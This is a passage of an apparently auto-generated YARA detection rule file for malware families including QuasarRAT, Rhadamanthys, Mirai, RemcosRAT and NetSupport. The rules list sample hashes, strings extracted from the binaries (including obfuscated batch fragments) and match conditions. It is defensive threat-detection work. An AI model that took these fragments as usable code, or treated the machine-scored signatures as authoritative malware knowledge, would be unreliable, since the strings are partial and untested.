      hash8 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash9 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash10 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
   strings:
      $s1 = "i32.dll" fullword ascii /* score: '20.00'*/
      $s2 = "l32.dll" fullword ascii /* score: '20.00'*/
      $s3 = "rof.dll" fullword ascii /* score: '20.00'*/
      $s4 = "SystemFuH" fullword ascii /* base64 encoded string 'K+-zan' */ /* score: '17.00'*/
      $s5 = "_32.dll" fullword ascii /* score: '17.00'*/
      $s6 = "runtime.gcWriteBarrierBX" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.gcWriteBarrierR9" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.gcWriteBarrierR8" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.gcWriteBarrierSI" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.useAVXmemmove" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.gcWriteBarrierDX" fullword ascii /* score: '10.00'*/
      $s12 = "winmm.dlH" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.gcWriteBarrierCX" fullword ascii /* score: '10.00'*/
      $s14 = "WSAGetOvH" fullword ascii /* score: '9.00'*/
      $s15 = "kernel32H" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__3b517279_QuasarRAT_signature__e673f2b5_118 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_3b517279.bat, QuasarRAT(signature)_e673f2b5.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3b5172795daf1ab20edc8738e850e2a920e5750e173d6bebd14beb6c5b4887f9"
      hash2 = "e673f2b5113583931f11a5a3ca8718afc4524431c1bed36a515e87b85025001c"
   strings:
      $s1 = "Iyww%%zlpCTxDq%%aGEYECQD%%wExSHuwg%%qClgSnXv%%qxLTKvHO%%NfzonUmV% %IqkTCEvg% %VFVXOeoP%%QdpNakGt%%lhucZEPB%%dGgmEoEg%%vkrTqHCe%%" ascii /* score: '13.00'*/
      $s2 = "%tAouaag%%tmRRTjG%%ViwznYi% %IvmDqEIh% %VoXECtBq%%svIzjemz%%hfpehcsU%%sauNgBIM%%znHnGXbS%%tSNNTpUx%%FGSkHZpS%%HUNfEvaQ%%sVLYiCrJ" ascii /* score: '9.00'*/
      $s3 = "%PuXmfFf%%UfoEzkJ%%EIiKGhO%%dkFFuID% %CtZgUUh%%qeQLwmd%%tkuHkDI% %uoCfNdr%%xdvVErI%%OUAGOLb%%SAOJDRA%%PcPxLnr%%iTCtrqc% %zAcyxcv" ascii /* score: '8.00'*/
      $s4 = " %sdqZxwXd% %RfdYsKYC%%XalCPioF%%xbUVsuVV%%awCTWhLU% %PenmIVKK% %ZZuOaUfO% %iTuCeDFZ%" fullword ascii /* score: '8.00'*/
      $s5 = "%WZAczdmd%%WHZuVVpT%%edRxjJtG%%TbusXWCy%%WSxRGMmO% %UmqJDwCS% %cZTKdEHI%%QrZgdgVm% %DNDLeMeN% %UyQhOXTX% %zKmxLeKx%%HENWGGjZ% %E" ascii /* score: '8.00'*/
      $s6 = "%gvlYZgj%%IbTBoTc% %jWPZNWK%%cRXXmHG%%jSWKuXy%%IArAbZh%%jRlfHzw%%PNwpTnI%%nSStZmR%%qdnAAyH%%LZwIjQe%%aHdyRCY%%SDjMRLE%%WCOFWLg%%" ascii /* score: '8.00'*/
      $s7 = "%jmjzFDgM%%pLxlLHga% %FmKKjqSd%%KnolGRno%" fullword ascii /* score: '8.00'*/
      $s8 = "exit /b" fullword ascii /* score: '8.00'*/
      $s9 = "zLTeQm%%fqTTanmg%" fullword ascii /* score: '8.00'*/
      $s10 = "% %gVPJxhKs%%lsnnuQnA% %RAzWnVNk% %JTuaaDaF%%fqCnbiif%%dxvHxRTe%%DbtweebN% %keSpouvQ% %PQXwIDWk%%JElnqNcL% %tnezlxqV% %btxUPsJr%" ascii /* score: '8.00'*/
      $s11 = "GbjzD% %JbDzTdOk% %AZSfJwyh%%omcqureG%%VXHstBtW%%MBVqKwim%%wpspSvzN% %DbRyVgbk%%FcGRuPEd%%ZJSueraD%%WXsdLafw%%ajnKLEfq% %uUsfiRU" ascii /* score: '8.00'*/
      $s12 = "i% %sdqZxwXd% %XZGXcptt%%bITemIeA%%PDsHmpMd%%EPDwtNSX%%JwvywByH%%JaeZufbl%%mXiZZDiO%%QXbbaLdh%%JMYjxJmZ% %uUsfiRUi% %gVPJxhKs%%l" ascii /* score: '8.00'*/
      $s13 = "YFOqEaX%%gURUEFGr%%aPRYCHHo%%NTEWPMVq% %MuGwEQhr%%yooVtnbW%%TnCIbibb%%UBBHHPck%%YNHPioJx%%kSbvaHNM%%tfKrcqIN%%BDnCupba%%TTXFHEBg" ascii /* score: '8.00'*/
      $s14 = "%%gzkTEHYK%%zTnBckcd% %ZAhnvfoq%%bPzgynTA% %VmCVKNZw%%MuzppFgM%" fullword ascii /* score: '8.00'*/
      $s15 = "RUi% %sdqZxwXd% %XZGXcptt%%DYpGbjzD% %jfzPmDTy%%pySiyIwn%%JzuIgjpW% %nUaVFPAK%%jPHNuulG%%ypnfYBXX%%VCyotNHD%%fCTJKqjb% %uUsfiRUi" ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x6540 and filesize < 8000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__01916ef7_Rhadamanthys_signature__1cf0e310ff7ad39ecc43438ffa3a0bb9_imphash__Rhadamanthys_signature___119 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash2 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash3 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash4 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "8Microsoft.Win32.Registry.dll" fullword ascii /* score: '23.00'*/
      $s2 = "@GetRuntimeMethodHandleComponents>GetRuntimeFieldHandleComponents" fullword ascii /* score: '15.00'*/
      $s3 = "6GetSupportedConsoleEncoding" fullword ascii /* score: '12.00'*/
      $s4 = "&AwakeWaiterIfNeeded2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s5 = ".GetEncodingFromProvider" fullword ascii /* score: '9.00'*/
      $s6 = "BGetIndexOfFirstNonLatin1Char_Sse2&NarrowUtf16ToLatin10NarrowUtf16ToLatin1_Sse2$WidenLatin1ToUtf16" fullword ascii /* score: '9.00'*/
      $s7 = "GetString@" fullword ascii /* score: '9.00'*/
      $s8 = "GetBytes@" fullword ascii /* score: '9.00'*/
      $s9 = "get_CodePage get_EncodingName" fullword ascii /* score: '9.00'*/
      $s10 = "GetEncoding2FilterDisallowedEncodings" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__93a138801d9601e4c36e6274c8b9d111_imphash__Rhadamanthys_signature__9cbefe68f395e67356e2a5d8d1b285c0__120 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_694ace6e.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_71f4b177.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_a14ca283.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_aaa80a57.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_bb3b307d.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_c2d5e6e9.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d99f5dd0.exe, Rhadamanthys(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_f5139fc2.exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash2 = "1c135fa1f43b3d884d9f826f9f4eb3895d9976609661a9d1e60e0752b938572c"
      hash3 = "694ace6efcabaf0ba32a66581b6e710bf432761f18984891a78b5377109d7ef9"
      hash4 = "71f4b177ab5dbf844397591deda7cbb750b4fc3dda07c10f41ee3d7615278976"
      hash5 = "a14ca283ce205cbc9c1ca540cdfc17ff62e28557de5fa1eedfdddfdd4456b27e"
      hash6 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash7 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash8 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash9 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash10 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
      hash11 = "5a68af44b9399b0bf6e41e5d60b994251dedb610c700dcfd81198b67a0518d0e"
      hash12 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.memhash128" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.(*pageAlloc).sysGrow.func3" fullword ascii /* score: '11.00'*/
      $s4 = "runtime.(*pageAlloc).sysGrow.func1" fullword ascii /* score: '11.00'*/
      $s5 = "runtime.(*pageAlloc).sysGrow.func2" fullword ascii /* score: '11.00'*/
      $s6 = "runtime.chunkIdx.l1" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.settls" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.arenaIdx.l2" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.addrRange.subtract" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.arenaIdx.l1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.firstcontinuetramp" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.chunkIdx.l2" fullword ascii /* score: '10.00'*/
      $s13 = "indexbytebody" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd44f39e_Mirai_signature__fdc864a8_121 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd44f39e.elf, Mirai(signature)_fdc864a8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd44f39e0f1ac9e64c08beb1d889a7e6f8e55a39e1e71d9a04bc32631a50cde3"
      hash2 = "fdc864a8a3fac746362f853859ddc92efd7d9bf1234059e46e53e7f540b3d2c4"
   strings:
      $s1 = "rsyslogd" fullword ascii /* score: '13.00'*/
      $s2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" fullword ascii /* score: '12.00'*/
      $s3 = "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s4 = "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s5 = "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4" fullword ascii /* score: '12.00'*/
      $s6 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17" fullword ascii /* score: '12.00'*/
      $s8 = "softbot.arm" fullword ascii /* score: '10.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s15 = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd885d0f_Mirai_signature__ff17f0a2_122 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd885d0f.elf, Mirai(signature)_ff17f0a2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd885d0fd20880cb0b672755e7a9b5a1951a892596444c84fde18ed73b523b16"
      hash2 = "ff17f0a26a0b58f72d9333f7c1ad10f18d4f8cb420fb6bcbea21e56f65e28b09"
   strings:
      $s1 = "getrlimit.c" fullword ascii /* score: '9.00'*/
      $s2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s3 = "__get_pc_thunk_bx" fullword ascii /* score: '9.00'*/
      $s4 = "__getpagesize" fullword ascii /* score: '9.00'*/
      $s5 = "__GI_getdtablesize" fullword ascii /* score: '9.00'*/
      $s6 = "__GI_getrlimit" fullword ascii /* score: '9.00'*/
      $s7 = "__GI_clock_getres" fullword ascii /* score: '9.00'*/
      $s8 = "getpagesize.c" fullword ascii /* score: '9.00'*/
      $s9 = "getArch" fullword ascii /* score: '9.00'*/
      $s10 = "clock_getres.c" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s12 = "__GI_getpagesize" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7548_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_123 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash2 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash3 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash4 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash5 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash6 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
   strings:
      $s1 = ",System.Collections.dll:System.Collections.Concurrent" fullword ascii /* score: '19.00'*/
      $s2 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle4TryGetMetadataForNamedType" fullword ascii /* score: '15.00'*/
      $s3 = "BResolveGenericVirtualMethodTarget@" fullword ascii /* score: '14.00'*/
      $s4 = "TGetMethodDescForDynamicRuntimeMethodHandle@" fullword ascii /* score: '12.00'*/
      $s5 = "nSystem.Numerics.INumberBase<nint>.TryConvertFromChecked" fullword ascii /* score: '10.00'*/
      $s6 = "System.Numerics.INumberBase<System.Int32>.TryConvertToSaturatingu" fullword ascii /* score: '10.00'*/
      $s7 = "System.Numerics.INumberBase<System.Int32>.TryConvertFromSaturating]" fullword ascii /* score: '10.00'*/
      $s8 = "*GetBytesForSmallInput,GetStringForSmallInput\\<GetMaxByteCount>g__ThrowArgumentException|7_0\\<GetMaxCharCount>g__ThrowArgument" ascii /* score: '9.00'*/
      $s9 = " CombineSelectors" fullword ascii /* score: '9.00'*/
      $s10 = "HTryGetDynamicGenericMethodDictionaryFTryGetStaticGenericMethodDictionary" fullword ascii /* score: '9.00'*/
      $s11 = "BTryGetGenericVirtualMethodPointer@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _NanoCore_signature__c9391c4d011b74463c0b80c8ef62af14_imphash__Rhadamanthys_signature__5e98697203060725aab7eca3f617223d_imph_124 {
   meta:
      description = "_subset_batch - from files NanoCore(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash).exe, Rhadamanthys(signature)_5e98697203060725aab7eca3f617223d(imphash).exe, Rhadamanthys(signature)_5e98697203060725aab7eca3f617223d(imphash)_307c3f55.exe, Rhadamanthys(signature)_5e98697203060725aab7eca3f617223d(imphash)_6ae3e47a.exe, Rhadamanthys(signature)_a7aa24c415f825313f717dd133b7e17b(imphash).exe, Rhadamanthys(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash).exe, Rhadamanthys(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash)_34adda05.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea90b2b47e8d066d16c597cc1db8d77734d2ed209835e836f5aaa0c6dc2d5c93"
      hash2 = "a5140d64bce3be4aebeb337098ee690b4da670caec044c9ae0dab78c6a5bb492"
      hash3 = "307c3f55aff96096d8178d52989116aff0e3d4b52b5b28ce38f7cecfbc99e2cd"
      hash4 = "6ae3e47a682279854e2c2ecbbe8fcddd5a763a3506089e74454c8fff027301ad"
      hash5 = "b020a00d492e10c75d1002c2da0289a21219738ad456c7eb49721613665a9966"
      hash6 = "8666d19b603834a8f842a86faddbbf0d8aeec003ff0b0152cff4c7fef936573d"
      hash7 = "34adda0535a9e54bbc979c755bf7a4cd69aa5a1cf82f8a4ed60b8be068fb0977"
   strings:
      $s1 = "  Ctrl+Alt+R  -> Recycle Documents\\AutoProx\\temp.txt" fullword wide /* score: '22.00'*/
      $s2 = "[HK] Recycled temp.txt" fullword wide /* score: '18.00'*/
      $s3 = "CreateFileW(temp)" fullword wide /* score: '11.00'*/
      $s4 = "AutoProx temp file." fullword wide /* score: '11.00'*/
      $s5 = "[HK] Recycle failed" fullword wide /* score: '10.00'*/
      $s6 = "AutoProx Hotkeys running." fullword wide /* score: '10.00'*/
      $s7 = "[!] Some hotkeys failed. Try closing apps that use Ctrl+Alt+U/O/R/L." fullword wide /* score: '10.00'*/
      $s8 = "ENDSESSION" fullword wide /* score: '9.50'*/
      $s9 = "SHFileOperationW(FO_DELETE)" fullword wide /* score: '9.00'*/
      $s10 = "  Ctrl+Alt+O  -> Open Documents folder" fullword wide /* score: '8.00'*/
      $s11 = "  Ctrl+Alt+L  -> Lock workstation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _NetSupport_signature__NetSupport_signature__7b35c44b_NetSupport_signature__d39c9278_NetSupport_signature__d76ad5e3_Rhadaman_125 {
   meta:
      description = "_subset_batch - from files NetSupport(signature).msi, NetSupport(signature)_7b35c44b.msi, NetSupport(signature)_d39c9278.msi, NetSupport(signature)_d76ad5e3.msi, Rhadamanthys(signature)_780d4eb9d2d1d7187d692847a2002744(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8afb4dcd3574e5a716e75a77a1ccdf9e23e6a03e181aa6a3ecb9b9d38e9aa039"
      hash2 = "7b35c44b77930bbd9945fccb6be71478471493810cdc9ae760e9a96de9b92955"
      hash3 = "d39c9278a6f915e3d87e4bdf4bbd820a3fad7b31b696bb05367347541549caa5"
      hash4 = "d76ad5e35972da2fa2b65ea714d4bd45839b93f4c94cbaa59bf985203b7fe3d7"
      hash5 = "5fa851e78ad7a0a13c96c2c427e789ee98831617ca23666ed7abd8d89de8818e"
   strings:
      $s1 = "uhttp://www.microsoft.com/pkiops/certs/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crt0-" fullword ascii /* score: '19.00'*/
      $s2 = "shttp://www.microsoft.com/pkiops/crl/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crl0" fullword ascii /* score: '19.00'*/
      $s3 = "uhttp://www.microsoft.com/pkiops/certs/Microsoft%20Identity%20Verification%20Root%20Certificate%20Authority%202020.crt0" fullword ascii /* score: '19.00'*/
      $s4 = "!http://oneocsp.microsoft.com/ocsp0f" fullword ascii /* score: '17.00'*/
      $s5 = "!http://oneocsp.microsoft.com/ocsp0" fullword ascii /* score: '17.00'*/
      $s6 = "[http://www.microsoft.com/pkiops/crl/Microsoft%20Public%20RSA%20Timestamping%20CA%202020.crl0y" fullword ascii /* score: '16.00'*/
      $s7 = "]http://www.microsoft.com/pkiops/certs/Microsoft%20Public%20RSA%20Timestamping%20CA%202020.crt0" fullword ascii /* score: '16.00'*/
      $s8 = "_http://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20Code%20Signing%20PCA%202021.crl0" fullword ascii /* score: '13.00'*/
      $s9 = ",Microsoft Public RSA Time Stamping Authority" fullword ascii /* score: '13.00'*/
      $s10 = ",Microsoft Public RSA Time Stamping Authority0" fullword ascii /* score: '13.00'*/
      $s11 = "ahttp://www.microsoft.com/pkiops/certs/Microsoft%20ID%20Verified%20Code%20Signing%20PCA%202021.crt0-" fullword ascii /* score: '13.00'*/
   condition:
      ( ( uint16(0) == 0xcfd0 or uint16(0) == 0x5a4d ) and filesize < 21000KB and pe.imphash() == "780d4eb9d2d1d7187d692847a2002744" and ( 8 of them )
      ) or ( all of them )
}

rule _QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__23228723_QuasarRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_126 {
   meta:
      description = "_subset_batch - from files QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_23228723.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7be2273b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8638d79b.exe, QuasarRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c9b1c066.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23228723bd373f0a2907aa450ebaf3a218fac346c3d854ee7554b899dcc198ab"
      hash2 = "7be2273bfc26f6f298548a4ff29de90dd24c8dc6b473ea06c2d59c62e09cedff"
      hash3 = "8638d79bd3e5370b1a1525cb43e9b92a5d99d58a947f4dc06c692f5f9a82bcd8"
      hash4 = "c9b1c0660b49eeaea761b489d5c00235f7a597b4a5b244643418d6375e436b42"
   strings:
      $s1 = "server1.exe" fullword wide /* score: '22.00'*/
      $s2 = "            compatibility then delete the requestedExecutionLevel node." fullword ascii /* score: '14.00'*/
      $s3 = "lns:asmv2=\"urn:schemas-microsoft-com:asm.v2\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">" fullword ascii /* score: '13.00'*/
      $s4 = "most compatible environment.-->" fullword ascii /* score: '12.00'*/
      $s5 = "            Specifying requestedExecutionLevel node will disable file and registry virtualization." fullword ascii /* score: '11.00'*/
      $s6 = "            requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s7 = ".NETFramework,Version=v4.8" fullword ascii /* score: '10.00'*/
      $s8 = "      <!-- A list of all Windows versions that this application is designed to work with. Windows will automatically select the " ascii /* score: '10.00'*/
      $s9 = ".NET Framework 4.8" fullword ascii /* score: '10.00'*/
      $s10 = "      <!-- If your application is designed to work with Windows 7, uncomment the following supportedOS node-->" fullword ascii /* score: '10.00'*/
      $s11 = "  </dependency>-->" fullword ascii /* score: '9.00'*/
      $s12 = "  <!-- <dependency>" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _PureCrypter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__03fa4975_Rhadamanthys_signature__308f67a5f891daad126b73e04_127 {
   meta:
      description = "_subset_batch - from files PureCrypter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_03fa4975.exe, Rhadamanthys(signature)_308f67a5f891daad126b73e042f69532(imphash).exe, Rhadamanthys(signature)_93a138801d9601e4c36e6274c8b9d111(imphash).exe, Rhadamanthys(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash)_984f14e5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "03fa49754cb5c96d49d1d9c5d27024e50df3551733b1ad3c0a2946f1951e6bc5"
      hash2 = "4e88e97019fa8f35358f01b9938a7cfa84bafd15cc8f029158817b3737e6fd98"
      hash3 = "a17b22c0eedfc76e3c98dedb4f0c7655370a70a3a715d82f253b5b5824be6105"
      hash4 = "984f14e5ffd9a1a2c5f6c1015b8b42cf2eab941e1bcccb2b176736b7ac8bebbb"
   strings:
      $s1 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s2 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s3 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s4 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s5 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s6 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s7 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
      $s8 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s9 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
      $s10 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s11 = "(GlobalSign Timestamping CA - SHA384 - G40" fullword ascii /* score: '11.00'*/
      $s12 = "(GlobalSign Timestamping CA - SHA384 - G4" fullword ascii /* score: '11.00'*/
      $s13 = "7http://secure.globalsign.com/cacert/gstsacasha384g4.crt0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__e791f8773bf0061740713805d84feea8_imphash__Rhadamanthys_signature__1cf0e310ff7ad39ecc43438ffa3a0bb9_imp_128 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
